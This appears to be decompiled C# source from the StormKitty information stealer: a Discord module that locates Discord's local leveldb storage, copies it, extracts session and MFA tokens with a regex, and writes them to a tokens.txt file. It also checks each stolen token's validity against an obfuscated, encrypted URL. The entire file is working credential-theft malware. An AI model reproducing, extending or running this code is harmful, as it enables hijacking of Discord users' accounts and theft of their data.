using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
	// Token: 0x02000017 RID: 23
	internal sealed class Discord
	{
		// Token: 0x0600007B RID: 123 RVA: 0x00004D3C File Offset: 0x00002F3C
		public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
		{
			if (lcDicordTokens.Length != 0)
			{
				Directory.CreateDirectory(sSavePath);
				Counter.Discord = true;
				try
				{
					foreach (string str in lcDicordTokens)
					{
						File.AppendAllText(sSavePath + "\\tokens.txt", str + "\n");
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
			try
			{
				Discord.CopyLevelDb(sSavePath);
			}
			catch
			{
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00004DBC File Offset: 0x00002FBC
		private static void CopyLevelDb(string sSavePath)
		{
			foreach (string path in Discord.DiscordDirectories)
			{
				string text = Path.Combine(Paths.appdata, path);
				string destFolder = Path.Combine(sSavePath, new DirectoryInfo(text).Name);
				if (Directory.Exists(text))
				{
					try
					{
						Filemanager.CopyDirectory(text, destFolder);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00004E28 File Offset: 0x00003028
		private static string TokenState(string token)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add("Authorization", token);
					return webClient.DownloadString(StringsCrypt.Decrypt(new byte[]
					{
						204,
						119,
						158,
						154,
						23,
						66,
						149,
						141,
						183,
						108,
						94,
						12,
						88,
						31,
						176,
						188,
						18,
						22,
						179,
						36,
						224,
						199,
						140,
						191,
						17,
						128,
						191,
						221,
						16,
						110,
						63,
						145,
						150,
						152,
						246,
						105,
						199,
						84,
						221,
						181,
						90,
						40,
						214,
						128,
						166,
						54,
						252,
						46
					})).Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
				}
			}
			catch
			{
			}
			return "Connection error";
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00004EB4 File Offset: 0x000030B4
		public static string[] GetTokens()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (string path in Discord.DiscordDirectories)
				{
					string text = Path.Combine(Paths.appdata, path);
					string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
					if (Directory.Exists(text))
					{
						Filemanager.CopyDirectory(text, text2);
						foreach (string text3 in Directory.GetFiles(text2))
						{
							if (text3.EndsWith(".log") || text3.EndsWith(".ldb"))
							{
								string input = File.ReadAllText(text3);
								Match match = Discord.TokenRegex.Match(input);
								if (match.Success)
								{
									list.Add(match.Value + " - " + Discord.TokenState(match.Value));
								}
							}
						}
						Filemanager.RecursiveDelete(text2);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list.ToArray();
		}

		// Token: 0x04000054 RID: 84
		private static Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

		// Token: 0x04000055 RID: 85
		private static string[] DiscordDirectories = new string[]
		{
			"Discord\\Local Storage\\leveldb",
			"Discord PTB\\Local Storage\\leveldb",
			"Discord Canary\\leveldb"
		};
	}
}
